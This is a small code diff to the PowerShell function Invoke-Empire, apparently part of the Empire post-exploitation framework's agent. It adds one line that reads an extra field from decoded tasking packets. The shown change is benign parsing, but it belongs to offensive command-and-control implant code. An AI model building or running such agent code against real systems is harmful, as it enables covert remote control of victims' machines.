@@ -991,6 +991,7 @@ function Invoke-Empire {
             $TaskID = $Decoded[3]
             $Length = $Decoded[4]
             $Data = $Decoded[5]
+            $Remaining = $Decoded[6]
 
             # process the new sub-packet and add it to the result set
             $ResultPackets += $(Process-Tasking $Type $Data $TaskID)
